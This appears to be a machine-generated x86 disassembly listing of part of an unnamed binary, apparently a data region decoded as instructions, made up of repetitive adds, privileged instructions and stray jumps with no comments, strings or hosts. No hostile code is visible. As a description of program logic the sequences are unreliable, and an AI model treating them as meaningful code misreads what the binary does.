  407057:	07                   	pop    %es
  407058:	47                   	inc    %edi
  407059:	02 c1                	add    %cl,%al
  40705b:	01 97 14 47 02 c1    	add    %edx,-0x3efdb8ec(%edi)
  407061:	01 c1                	add    %eax,%ecx
  407063:	17                   	pop    %ss
  407064:	42                   	inc    %edx
  407065:	02 09                	add    (%ecx),%cl
  407067:	03 03                	add    (%ebx),%eax
  407069:	15 6b 01 09 03       	adc    $0x309016b,%eax
  40706e:	5c                   	pop    %esp
  40706f:	19 6a 05             	sbb    %ebp,0x5(%edx)
  407072:	11 03                	adc    %eax,(%ebx)
  407074:	eb 14                	jmp    0x40708a
  407076:	70 05                	jo     0x40707d
  407078:	19 03                	sbb    %eax,(%ebx)
  40707a:	ec                   	in     (%dx),%al
  40707b:	1a 76 05             	sbb    0x5(%esi),%dh
  40707e:	21 03                	and    %eax,(%ebx)
  407080:	d3 0f                	rorl   %cl,(%edi)
  407082:	7c 05                	jl     0x407089
  407084:	c1 01 08             	roll   $0x8,(%ecx)
  407087:	1a 47 02             	sbb    0x2(%edi),%al
  40708a:	19 03                	sbb    %eax,(%ebx)
  40708c:	d8 1b                	fcomps (%ebx)
  40708e:	bf 01 81 02 cf       	mov    $0xcf028101,%edi
  407093:	05 86 05 29 03       	add    $0x3290586,%eax
  407098:	6e                   	outsb  %ds:(%esi),(%dx)
  407099:	00 f4                	add    %dh,%ah
  40709b:	01 59 01             	add    %ebx,0x1(%ecx)
  40709e:	4d                   	dec    %ebp
  40709f:	1b 7b 00             	sbb    0x0(%ebx),%edi
  4070a2:	59                   	pop    %ecx
  4070a3:	01 7c 07 c3          	add    %edi,-0x3d(%edi,%eax,1)
  4070a7:	00 59 01             	add    %bl,0x1(%ecx)
  4070aa:	3e 07                	ds pop %es
  4070ac:	c3                   	ret
  4070ad:	00 59 01             	add    %bl,0x1(%ecx)
  4070b0:	02 11                	add    (%ecx),%dl
  4070b2:	93                   	xchg   %eax,%ebx
  4070b3:	05 c1 01 bf 18       	add    $0x18bf01c1,%eax
  4070b8:	99                   	cltd
  4070b9:	05 49 03 03 15       	add    $0x15030349,%eax
  4070be:	0e                   	push   %cs
  4070bf:	00 61 01             	add    %ah,0x1(%ecx)
  4070c2:	59                   	pop    %ecx
  4070c3:	02 cd                	add    %ch,%cl
  4070c5:	03 51 03             	add    0x3(%ecx),%edx
  4070c8:	1b 0d 75 01 69 00    	sbb    0x690175,%ecx
  4070ce:	03 15 0e 00 21 02    	add    0x221000e,%edx
  4070d4:	68 0c 70 01 69       	push   $0x6901700c
  4070d9:	00 d0                	add    %dl,%al
  4070db:	04 aa                	add    $0xaa,%al
  4070dd:	05 c1 01 cc 0c       	add    $0xccc01c1,%eax
  4070e2:	b0 05                	mov    $0x5,%al
  4070e4:	c1 01 45             	roll   $0x45,(%ecx)
  4070e7:	14 47                	adc    $0x47,%al
  4070e9:	02 c1                	add    %cl,%al
  4070eb:	01 e9                	add    %ebp,%ecx
  4070ed:	04 bd                	add    $0xbd,%al
  4070ef:	05 59 01 dc 0f       	add    $0xfdc0159,%eax
  4070f4:	1d 00 61 03 68       	sbb    $0x68036100,%eax
  4070f9:	0c 47                	or     $0x47,%al
  4070fb:	02 69 03             	add    0x3(%ecx),%ch
  4070fe:	4a                   	dec    %edx
  4070ff:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  407104:	b7 07                	mov    $0x7,%bh
  407106:	c3                   	ret
  407107:	05 59 03 c9 07       	add    $0x7c90359,%eax
  40710c:	c3                   	ret
  40710d:	05 59 03 68 0c       	add    $0xc680359,%eax
  407112:	47                   	inc    %edi
  407113:	02 71 03             	add    0x3(%ecx),%dh
  407116:	f8                   	clc
  407117:	1a c9                	sbb    %cl,%cl
  407119:	05 79 03 03 15       	add    $0x15030379,%eax
  40711e:	cf                   	iret
  40711f:	05 79 03 78 06       	add    $0x6780379,%eax
  407124:	d6                   	salc
  407125:	05 c1 00 65 08       	add    $0x86500c1,%eax
  40712a:	0e                   	push   %cs
  40712b:	00 19                	add    %bl,(%ecx)
  40712d:	00 65 08             	add    %ah,0x8(%ebp)
  407130:	0e                   	push   %cs
  407131:	00 09                	add    %cl,(%ecx)
  407133:	03 03                	add    (%ebx),%eax
  407135:	15 36 02 0c 00       	adc    $0xc0236,%eax
  40713a:	03 15 0e 00 0c 00    	add    0xc000e,%edx
  407140:	29 03                	sub    %eax,(%ebx)
  407142:	f5                   	cmc
  407143:	05 0c 00 43 1b       	add    $0x1b43000c,%eax
  407148:	f4                   	hlt
  407149:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  40714c:	74 1c                	je     0x40716a
  40714e:	fb                   	sti
  40714f:	05 c1 01 e1 10       	add    $0x10e101c1,%eax
  407154:	01 06                	add    %eax,(%esi)
  407156:	51                   	push   %ecx
  407157:	00 f0                	add    %dh,%al
  407159:	17                   	pop    %ss
  40715a:	11 06                	adc    %eax,(%esi)
  40715c:	51                   	push   %ecx
  40715d:	00 f4                	add    %dh,%ah
  40715f:	01 17                	add    %edx,(%edi)
  407161:	06                   	push   %es
  407162:	59                   	pop    %ecx
  407163:	00 72 03             	add    %dh,0x3(%edx)
  407166:	17                   	pop    %ss
  407167:	06                   	push   %es
  407168:	89 03                	mov    %eax,(%ebx)
  40716a:	6d                   	insl   (%dx),%es:(%edi)
  40716b:	1d 1d 06 69 00       	sbb    $0x69061d,%eax
  407170:	03 15 01 03 61 00    	add    0x610301,%edx
  407176:	03 15 2d 06 91 03    	add    0x391062d,%edx
  40717c:	65 08 0e             	or     %cl,%gs:(%esi)
  40717f:	00 99 03 03 15 56    	add    %bl,0x56150303(%ecx)
  407185:	04 a1                	add    $0xa1,%al
  407187:	03 b7 0b 35 06 81    	add    -0x7ef9caf5(%edi),%esi
  40718d:	02 1e                	add    (%esi),%bl
  40718f:	05 0a 00 91 02       	add    $0x291000a,%eax
  407194:	a3 1c 35 05 91       	mov    %eax,0x9105351c
  407199:	02 bf 0a 43 06 89    	add    -0x76f9bcf6(%edi),%bh
  40719f:	01 80 05 47 02 91    	add    %eax,-0x6efdb8fb(%eax)
  4071a5:	02 a3 1c 54 06 91    	add    -0x6ef9abe4(%ebx),%ah
  4071ab:	02 b6 0a 7c 05 91    	add    -0x6efa83f6(%esi),%dh
  4071b1:	02 9f 0a 6b 01 91    	add    -0x6efe94f6(%edi),%bl
  4071b7:	02 bd 1c 5e 06 91    	add    -0x6ef9a1e4(%ebp),%bh
  4071bd:	02 6f 05             	add    0x5(%edi),%ch
  4071c0:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071c3:	00 29                	add    %ch,(%ecx)
  4071c5:	03 f5                	add    %ebp,%esi
  4071c7:	05 b9 03 ac 1b       	add    $0x1bac03b9,%eax
  4071cc:	7c 06                	jl     0x4071d4
  4071ce:	1c 00                	sbb    $0x0,%al
  4071d0:	eb 14                	jmp    0x4071e6
  4071d2:	92                   	xchg   %eax,%edx
  4071d3:	06                   	push   %es
  4071d4:	24 00                	and    $0x0,%al
  4071d6:	ec                   	in     (%dx),%al
  4071d7:	1a a4 06 1c 00 ea 0a 	sbb    0xaea001c(%esi,%eax,1),%ah
  4071de:	a9 06 24 00 d8       	test   $0xd8002406,%eax
  4071e3:	1b bf 01 c9 03 be    	sbb    -0x41fc36ff(%edi),%edi
  4071e9:	10 b3 06 c9 03 1f    	adc    %dh,0x1f03c906(%ebx)
  4071ef:	03 b9 06 d1 03 2c    	add    0x2c03d106(%ecx),%edi
  4071f5:	08 c1                	or     %al,%cl
  4071f7:	06                   	push   %es
  4071f8:	e1 03                	loope  0x4071fd
  4071fa:	f1                   	int1
  4071fb:	04 c8                	add    $0xc8,%al
  4071fd:	06                   	push   %es
  4071fe:	d9 03                	flds   (%ebx)
  407200:	0f 06                	clts
  407202:	cf                   	iret
  407203:	06                   	push   %es
  407204:	f1                   	int1
  407205:	03 ba 08 d8 06 01    	add    0x106d808(%edx),%edi
  40720b:	04 d3                	add    $0xd3,%al
  40720d:	12 e2                	adc    %dl,%ah
  40720f:	06                   	push   %es
  407210:	2c 00                	sub    $0x0,%al
  407212:	ba 08 17 07 2c       	mov    $0x2c071708,%edx
  407217:	00 6f 19             	add    %ch,0x19(%edi)
  40721a:	23 07                	and    (%edi),%eax
  40721c:	34 00                	xor    $0x0,%al
  40721e:	9c                   	pushf
  40721f:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  407224:	03 15 0e 00 c1 01    	add    0x1c1000e,%edx
  40722a:	ab                   	stos   %eax,%es:(%edi)
  40722b:	1d 84 00 21 04       	sbb    $0x4210084,%eax
  407230:	03 15 6b 01 19 04    	add    0x419016b,%edx
  407236:	03 15 59 07 29 04    	add    0x4290759,%edx
  40723c:	b7 16                	mov    $0x16,%bh
  40723e:	61                   	popa
  40723f:	07                   	pop    %es
  407240:	51                   	push   %ecx
  407241:	01 33                	add    %esi,(%ebx)
  407243:	0c 93                	or     $0x93,%al
  407245:	01 49 04             	add    %ecx,0x4(%ecx)
  407248:	03 15 6b 01 59 02    	add    0x259016b,%edx
  40724e:	03 15 0e 00 31 04    	add    0x431000e,%edx
  407254:	03 15 0e 00 51 04    	add    0x451000e,%edx
  40725a:	5f                   	pop    %edi
  40725b:	0b 01                	or     (%ecx),%eax
  40725d:	03 51 04             	add    0x4(%ecx),%edx
  407260:	fc                   	cld
  407261:	0a 01                	or     (%ecx),%al
  407263:	03 51 04             	add    0x4(%ecx),%edx
  407266:	00 05 7a 07 51 04    	add    %al,0x451077a
  40726c:	ab                   	stos   %eax,%es:(%edi)
  40726d:	0b 81 07 51 04 9b    	or     -0x64fbaef9(%ecx),%eax
  407273:	1c 2b                	sbb    $0x2b,%al
  407275:	02 51 04             	add    0x4(%ecx),%dl
  407278:	93                   	xchg   %eax,%ebx
  407279:	02 0e                	add    (%esi),%cl
  40727b:	00 51 04             	add    %dl,0x4(%ecx)
  40727e:	28 15 88 07 39 04    	sub    %dl,0x4390788
  407284:	03 15 8e 07 51 04    	add    0x451078e,%edx
  40728a:	85 02                	test   %eax,(%edx)
  40728c:	31 02                	xor    %eax,(%edx)
  40728e:	39 04 4e             	cmp    %eax,(%esi,%ecx,2)
  407291:	0e                   	push   %cs
  407292:	0e                   	push   %cs
  407293:	00 41 04             	add    %al,0x4(%ecx)
  407296:	03 15 2b 02 59 02    	add    0x259022b,%edx
  40729c:	74 1c                	je     0x4072ba
  40729e:	31 02                	xor    %eax,(%edx)
  4072a0:	51                   	push   %ecx
  4072a1:	03 1b                	add    (%ebx),%ebx
  4072a3:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a8:	03 15 6b 01 51 04    	add    0x451016b,%edx
  4072ae:	8c 02                	mov    %es,(%edx)
  4072b0:	2b 02                	sub    (%edx),%eax
  4072b2:	51                   	push   %ecx
  4072b3:	04 18                	add    $0x18,%al
  4072b5:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072ba:	7f 0d                	jg     0x4072c9
  4072bc:	23 02                	and    (%edx),%eax
  4072be:	81 04 2e 1d be 07 91 	addl   $0x9107be1d,(%esi,%ebp,1)
  4072c5:	04 57                	add    $0x57,%al
  4072c7:	1c d0                	sbb    $0xd0,%al
  4072c9:	07                   	pop    %es
  4072ca:	a1 04 03 15 0e       	mov    0xe150304,%eax
  4072cf:	00 c1                	add    %al,%cl
  4072d1:	01 cb                	add    %ecx,%ebx
  4072d3:	18 f9                	sbb    %bh,%cl
  4072d5:	07                   	pop    %es
  4072d6:	49                   	dec    %ecx
  4072d7:	02 b7 16 99 01 49    	add    0x49019916(%edi),%dh
  4072dd:	02 b7 16 ab 01 a9    	add    -0x56fe54ea(%edi),%dh
  4072e3:	00 03                	add    %al,(%ebx)
  4072e5:	15 0e 00 1c 00       	adc    $0x1c000e,%eax
  4072ea:	d3 0f                	rorl   %cl,(%edi)
  4072ec:	06                   	push   %es
  4072ed:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072f0:	43                   	inc    %ebx
  4072f1:	1b f4                	sbb    %esp,%esi
  4072f3:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072f6:	c8 12 0e 00          	enter  $0xe12,$0x0
  4072fa:	c1 01 74             	roll   $0x74,(%ecx)
  4072fd:	17                   	pop    %ss
  4072fe:	42                   	inc    %edx
  4072ff:	02 c1                	add    %cl,%al
  407301:	00 95 0a 28 08 49    	add    %dl,0x4908280a(%ebp)
  407307:	02 b7 16 a5 01 51    	add    0x5101a516(%edi),%dh
  40730d:	01 ad 00 32 08 c1    	add    %ebp,-0x3ef7ce00(%ebp)
  407313:	01 3d 10 47 02 a9    	add    %edi,0xa9024710
  407319:	04 73                	add    $0x73,%al
  40731b:	08 37                	or     %dh,(%edi)
  40731d:	08 51 01             	or     %dl,0x1(%ecx)
  407320:	ad                   	lods   %ds:(%esi),%eax
  407321:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  407324:	51                   	push   %ecx
  407325:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  40732b:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407331:	01 ce                	add    %ecx,%esi
  407333:	00 4d 08             	add    %cl,0x8(%ebp)
  407336:	41                   	inc    %ecx
  407337:	03 73 08             	add    0x8(%ebx),%esi
  40733a:	52                   	push   %edx
  40733b:	08 51 01             	or     %dl,0x1(%ecx)
  40733e:	ce                   	into
  40733f:	00 57 08             	add    %dl,0x8(%edi)
  407342:	51                   	push   %ecx
  407343:	01 ce                	add    %ecx,%esi
  407345:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407349:	01 ce                	add    %ecx,%esi
  40734b:	00 61 08             	add    %ah,0x8(%ecx)
  40734e:	51                   	push   %ecx
  40734f:	01 bb 05 68 08 b1    	add    %edi,-0x4ef797fb(%ebx)
  407355:	04 73                	add    $0x73,%al
  407357:	08 6d 08             	or     %ch,0x8(%ebp)
  40735a:	49                   	dec    %ecx
  40735b:	02 b7 16 7a 08 59    	add    0x59087a16(%edi),%dh
  407361:	03 44 1d 23          	add    0x23(%ebp,%ebx,1),%eax
  407365:	02 e1                	add    %cl,%ah
  407367:	02 03                	add    (%ebx),%al
  407369:	15 88 08 c1 00       	adc    $0xc10888,%eax
  40736e:	8c 0a                	mov    %cs,(%edx)
  407370:	f4                   	hlt
  407371:	01 89 01 03 15 6b    	add    %ecx,0x6b150301(%ecx)
  407377:	01 49 02             	add    %ecx,0x2(%ecx)
  40737a:	e0 00                	loopne 0x40737c
  40737c:	b6 08                	mov    $0x8,%dh
  40737e:	49                   	dec    %ecx
  40737f:	02 38                	add    (%eax),%bh
  407381:	06                   	push   %es
  407382:	bd 08 49 02 bb       	mov    $0xbb024908,%ebp
  407387:	05 c4 08 49 02       	add    $0x24908c4,%eax
  40738c:	65 00 cb             	gs add %cl,%bl
  40738f:	08 49 02             	or     %cl,0x2(%ecx)
  407392:	ad                   	lods   %ds:(%esi),%eax
  407393:	00 d2                	add    %dl,%dl
  407395:	08 49 02             	or     %cl,0x2(%ecx)
  407398:	e9 00 d9 08 49       	jmp    0x49494c9d
  40739d:	02 ce                	add    %dh,%cl
  40739f:	00 e0                	add    %ah,%al
  4073a1:	08 49 02             	or     %cl,0x2(%ecx)
  4073a4:	b7 16                	mov    $0x16,%bh
  4073a6:	12 09                	adc    (%ecx),%cl
  4073a8:	d1 04 03             	roll   $1,(%ebx,%eax,1)
  4073ab:	15 28 09 09 00       	adc    $0x90928,%eax
  4073b0:	80 00 0d             	addb   $0xd,(%eax)
  4073b3:	01 09                	add    %ecx,(%ecx)
  4073b5:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073bc:	88 00                	mov    %al,(%eax)
  4073be:	17                   	pop    %ss
  4073bf:	01 08                	add    %ecx,(%eax)
  4073c1:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073c7:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073ce:	a0 00 66 01 08       	mov    0x8016600,%al
  4073d3:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073da:	ec                   	in     (%dx),%al
  4073db:	00 7f 02             	add    %bh,0x2(%edi)
  4073de:	08 00                	or     %al,(%eax)
  4073e0:	f0 00 17             	lock add %dl,(%edi)
  4073e3:	01 08                	add    %ecx,(%eax)
  4073e5:	00 f4                	add    %dh,%ah
  4073e7:	00 12                	add    %dl,(%edx)
  4073e9:	01 08                	add    %ecx,(%eax)
  4073eb:	00 f8                	add    %bh,%al
  4073ed:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073f4:	89 02                	mov    %eax,(%edx)
  4073f6:	08 00                	or     %al,(%eax)
  4073f8:	00 01                	add    %al,(%ecx)
  4073fa:	8e 02                	mov    (%edx),%es
  4073fc:	08 00                	or     %al,(%eax)
  4073fe:	04 01                	add    $0x1,%al
  407400:	93                   	xchg   %eax,%ebx
  407401:	02 08                	add    (%eax),%cl
  407403:	00 08                	add    %cl,(%eax)
  407405:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  40740b:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407411:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  407417:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  40741d:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  407424:	06                   	push   %es
  407425:	03 2e                	add    (%esi),%ebp
  407427:	00 33                	add    %dh,(%ebx)
  407429:	00 0f                	add    %cl,(%edi)
  40742b:	03 2e                	add    (%esi),%ebp
  40742d:	00 3b                	add    %bh,(%ebx)
  40742f:	00 34 03             	add    %dh,(%ebx,%eax,1)
  407432:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  407436:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  40743b:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407441:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  407447:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  40744d:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  407453:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407459:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  40745f:	00 43 03             	add    %al,0x3(%ebx)
  407462:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407469:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  40746f:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  407475:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  40747b:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407481:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  407487:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  40748d:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  407493:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407499:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  40749f:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  4074a5:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074ab:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074b1:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074b7:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074bd:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074c3:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c9:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074cf:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074d5:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074db:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074e1:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074e7:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074ed:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074f3:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f9:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074ff:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  407505:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  40750b:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407511:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  407517:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  40751d:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  407523:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407529:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  40752f:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  407535:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  40753b:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407541:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407547:	00 20                	add    %ah,(%eax)
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40754e:	01 00                	add    %eax,(%eax)
  407550:	06                   	push   %es
  407551:	00 00                	add    %al,(%eax)
  407553:	00 1e                	add    %bl,(%esi)
  407555:	00 c0                	add    %al,%al
  407557:	03 c9                	add    %ecx,%ecx
  407559:	03 f4                	add    %esp,%esi
  40755b:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  407562:	54                   	push   %esp
  407563:	05 59 05 81 05       	add    $0x5810559,%eax
  407568:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  40756e:	b6 05                	mov    $0x5,%dh
  407570:	dd 05 08 06 27 06    	fldl   0x6270608
  407576:	3c 06                	cmp    $0x6,%al
  407578:	4c                   	dec    %esp
  407579:	06                   	push   %es
  40757a:	66 06                	pushw  %es
  40757c:	af                   	scas   %es:(%edi),%eax
  40757d:	06                   	push   %es
  40757e:	53                   	push   %ebx
  40757f:	07                   	pop    %es
  407580:	67 07                	addr16 pop %es
  407582:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  407587:	07                   	pop    %es
  407588:	e8 07 f0 07 ff       	call   0xff486594
  40758d:	07                   	pop    %es
  40758e:	0c 08                	or     $0x8,%al
  407590:	11 08                	adc    %ecx,(%eax)
  407592:	20 08                	and    %cl,(%eax)
  407594:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407599:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  40759f:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  4075a5:	08 f7                	or     %dh,%bh
  4075a7:	08 fc                	or     %bh,%ah
  4075a9:	08 02                	or     %al,(%edx)
  4075ab:	09 0b                	or     %ecx,(%ebx)
  4075ad:	09 18                	or     %ebx,(%eax)
  4075af:	09 31                	or     %esi,(%ecx)
  4075b1:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075b4:	01 00                	add    %eax,(%eax)
  4075b6:	16                   	push   %ss
  4075b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075ba:	17                   	pop    %ss
  4075bb:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075c1:	00 00                	add    %al,(%eax)
  4075c3:	00 62 1a             	add    %ah,0x1a(%edx)
  4075c6:	9f                   	lahf
  4075c7:	00 00                	add    %al,(%eax)
  4075c9:	00 46 1a             	add    %al,0x1a(%esi)
  4075cc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075cd:	00 00                	add    %al,(%eax)
  4075cf:	00 9f 13 a9 00 00    	add    %bl,0xa913(%edi)
  4075d5:	00 2b                	add    %ch,(%ebx)
  4075d7:	0b ae 00 00 00 dc    	or     -0x24000000(%esi),%ebp
  4075dd:	19 ae 00 00 00 e0    	sbb    %ebp,-0x20000000(%esi)
  4075e3:	0a b2 00 00 00 5d    	or     0x5d000000(%edx),%dh
  4075e9:	03 b7 00 00 00 fd    	add    -0x3000000(%edi),%esi
  4075ef:	02 bb 00 00 00 95    	add    -0x6b000000(%ebx),%bh
  4075f5:	0b b2 00 00 00 ff    	or     -0x1000000(%edx),%esi
  4075fb:	0e                   	push   %cs
  4075fc:	bf 00 00 00 fa       	mov    $0xfa000000,%edi
  407601:	0c b7                	or     $0xb7,%al
  407603:	00 00                	add    %al,(%eax)
  407605:	00 a6 1a c3 01 00    	add    %ah,0x1c31a(%esi)
  40760b:	00 d7                	add    %dl,%bh
  40760d:	0f f8 01             	psubb  (%ecx),%mm0
  407610:	00 00                	add    %al,(%eax)
  407612:	9a 0d fe 01 00 00 a8 	lcall  $0xa800,$0x1fe0d
  407619:	0c 69                	or     $0x69,%al
  40761b:	02 00                	add    (%eax),%al
  40761d:	00 df                	add    %bl,%bh
  40761f:	13 6d 02             	adc    0x2(%ebp),%ebp
  407622:	00 00                	add    %al,(%eax)
  407624:	0a 19                	or     (%ecx),%bl
  407626:	71 02                	jno    0x40762a
  407628:	00 00                	add    %al,(%eax)
  40762a:	8b 1c 75 02 00 00 ff 	mov    -0xfffffe(,%esi,2),%ebx
  407631:	07                   	pop    %es
  407632:	7a 02                	jp     0x407636
  407634:	02 00                	add    (%eax),%al
  407636:	06                   	push   %es
  407637:	00 03                	add    %al,(%ebx)
  407639:	00 01                	add    %al,(%ecx)
  40763b:	00 07                	add    %al,(%edi)
  40763d:	00 03                	add    %al,(%ebx)
  40763f:	00 02                	add    %al,(%edx)
  407641:	00 08                	add    %cl,(%eax)
  407643:	00 05 00 01 00 09    	add    %al,0x9000100
  407649:	00 05 00 02 00 0a    	add    %al,0xa000200
  40764f:	00 07                	add    %al,(%edi)
  407651:	00 01                	add    %al,(%ecx)
  407653:	00 0b                	add    %cl,(%ebx)
  407655:	00 07                	add    %al,(%edi)
  407657:	00 02                	add    %al,(%edx)
  407659:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40765c:	09 00                	or     %eax,(%eax)
  40765e:	01 00                	add    %eax,(%eax)
  407660:	0d 00 09 00 02       	or     $0x2000900,%eax
  407665:	00 0e                	add    %cl,(%esi)
  407667:	00 0b                	add    %cl,(%ebx)
  407669:	00 01                	add    %al,(%ecx)
  40766b:	00 0f                	add    %cl,(%edi)
  40766d:	00 0b                	add    %cl,(%ebx)
  40766f:	00 02                	add    %al,(%edx)
  407671:	00 10                	add    %dl,(%eax)
  407673:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407679:	00 0d 00 02 00 12    	add    %cl,0x12000200
  40767f:	00 0f                	add    %cl,(%edi)
  407681:	00 01                	add    %al,(%ecx)
  407683:	00 13                	add    %dl,(%ebx)
  407685:	00 0f                	add    %cl,(%edi)
  407687:	00 02                	add    %al,(%edx)
  407689:	00 14 00             	add    %dl,(%eax,%eax,1)
  40768c:	11 00                	adc    %eax,(%eax)
  40768e:	02 00                	add    (%eax),%al
  407690:	15 00 13 00 01       	adc    $0x1001300,%eax
  407695:	00 16                	add    %dl,(%esi)
  407697:	00 13                	add    %dl,(%ebx)
  407699:	00 02                	add    %al,(%edx)
  40769b:	00 17                	add    %dl,(%edi)
  40769d:	00 15 00 01 00 18    	add    %dl,0x18000100
  4076a3:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a9:	00 17                	add    %dl,(%edi)
  4076ab:	00 01                	add    %al,(%ecx)
  4076ad:	00 1a                	add    %bl,(%edx)
  4076af:	00 17                	add    %dl,(%edi)
  4076b1:	00 02                	add    %al,(%edx)
  4076b3:	00 60 00             	add    %ah,0x0(%eax)
  4076b6:	19 00                	sbb    %eax,(%eax)
  4076b8:	02 00                	add    (%eax),%al
  4076ba:	68 00 1b 00 02       	push   $0x2001b00
  4076bf:	00 69 00             	add    %ch,0x0(%ecx)
  4076c2:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076c7:	00 1f                	add    %bl,(%edi)
  4076c9:	00 01                	add    %al,(%ecx)
  4076cb:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076d2:	8d 00                	lea    (%eax),%eax
  4076d4:	21 00                	and    %eax,(%eax)
  4076d6:	01 00                	add    %eax,(%eax)
  4076d8:	8e 00                	mov    (%eax),%es
  4076da:	21 00                	and    %eax,(%eax)
  4076dc:	02 00                	add    (%eax),%al
  4076de:	8f 00                	pop    (%eax)
  4076e0:	23 00                	and    (%eax),%eax
  4076e2:	01 00                	add    %eax,(%eax)
  4076e4:	90                   	nop
  4076e5:	00 23                	add    %ah,(%ebx)
  4076e7:	00 02                	add    %al,(%edx)
  4076e9:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076ef:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076f5:	00 c0                	add    %al,%al
  4076f7:	00 03                	add    %al,(%ebx)
  4076f9:	00 16                	add    %dl,(%esi)
  4076fb:	00 c2                	add    %al,%dl
  4076fd:	00 05 00 16 00 c4    	add    %al,0xc4001600
  407703:	00 07                	add    %al,(%edi)
  407705:	00 18                	add    %bl,(%eax)
  407707:	00 26                	add    %ah,(%esi)
  407709:	01 09                	add    %ecx,(%ecx)
  40770b:	00 24 0f             	add    %ah,(%edi,%ecx,1)
  40770e:	17                   	pop    %ss
  40770f:	0f 2f 0f             	comiss (%edi),%xmm1
  407712:	ef                   	out    %eax,(%dx)
  407713:	05 5b 06 75 06       	add    $0x675065b,%eax
  407718:	9c                   	pushf
  407719:	06                   	push   %es
  40771a:	ff 06                	incl   (%esi)
  40771c:	27                   	daa
